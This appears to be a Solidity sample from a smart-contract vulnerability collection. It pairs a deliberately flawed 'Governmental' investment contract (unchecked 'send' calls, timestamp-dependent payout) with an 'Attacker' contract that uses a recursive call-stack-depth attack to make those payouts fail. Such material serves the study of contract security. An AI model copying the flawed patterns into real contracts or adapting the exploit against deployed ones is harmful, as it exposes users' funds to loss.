pragma solidity ^0.4.0;

contract Governmental {
  address public o;
  address public lI;
  uint public j = 1 ether;
  uint public lIT;
  uint public OM = 1 minutes;

  function Governmental() {
    o = msg.sender;
    if (msg.value < 1 ether) throw;
  }

  function invest() {
    if (msg.value < j / 2) throw;
    lI = msg.sender;
    j += msg.value / 2;
    lIT = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < lIT + OM) throw;
    lI.send(j);
    o.send(this.balance - 1 ether);
    lI = 0;
    j = 1 ether;
    lIT = 0;
  }
}

contract Attacker {

  function attack(address t, uint c) {
    recursiveAttack(t, c);
  }

  function recursiveAttack(address t, uint c) private {
    if (0 <= c && c < 1023) {
      this.attack.gas(msg.gas - 2000)(t, c + 1);
    } else {
      Governmental(t).resetInvestment();
    }
  }
}